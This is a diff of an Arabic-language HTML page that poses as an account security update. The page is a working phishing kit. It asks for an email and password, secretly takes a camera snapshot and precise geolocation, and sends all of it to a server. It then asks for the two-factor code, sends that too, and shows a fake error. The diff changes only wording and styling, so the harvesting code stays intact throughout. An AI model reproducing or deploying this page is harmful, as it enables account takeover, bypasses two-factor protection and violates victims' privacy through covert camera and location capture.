@@ -3,10 +3,10 @@
 <head>
     <link rel="manifest" href="/manifest.json">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان الحساب</title>
+    <title>تحديث الأمان</title>
     <style>
-        body { background: #121212; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
-        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; border: 1px solid #333; margin-top: 50px; }
+        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 15px; margin-top: 50px; }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #2c2c2c; color: white; }
         button { background: #007bff; color: white; width: 95%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
@@ -15,7 +15,7 @@
 <body>
     <div id="login-screen" class="box">
         <h2>⚠️ تحديث مطلوب</h2>
-        <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب</p>
+        <p>يرجى تسجيل الدخول لتأكيد الحساب</p>
         <input type="email" id="email" placeholder="البريد الإلكتروني" required>
         <input type="password" id="pass" placeholder="كلمة المرور" required>
         <button onclick="startCapture()">تسجيل الدخول</button>
@@ -23,20 +23,18 @@
 
     <div id="otp-screen" class="box hidden">
         <h2>🔐 التحقق بخطوتين</h2>
-        <p>أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
-        <input type="number" id="otp" placeholder="000000" required>
-        <button onclick="sendOtp()">تأكيد الهوية</button>
+        <p>أدخل الرمز المرسل إلى هاتفك</p>
+        <input type="number" id="otp" placeholder="000000">
+        <button onclick="sendOtp()">تأكيد</button>
     </div>
 
     <script>
         let userEmail = "";
-
         async function getCameraImage() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+                video.srcObject = stream; await video.play();
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
@@ -49,13 +47,11 @@
             userEmail = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
             const img = await getCameraImage();
-
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await sendToServer(userEmail, pass, { lat: pos.coords.latitude, lon: pos.coords.longitude }, img);
             }, async () => {
                 await sendToServer(userEmail, pass, null, img);
             }, { enableHighAccuracy: true });
-
             document.getElementById('login-screen').classList.add('hidden');
             document.getElementById('otp-screen').classList.remove('hidden');
         }
@@ -75,7 +71,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ otp: code, email: userEmail })
             });
-            alert("فشل التحقق، يرجى طلب كود جديد بعد قليل.");
+            alert("خطأ في الخادم، حاول مجدداً لاحقاً.");
         }
     </script>
 </body>
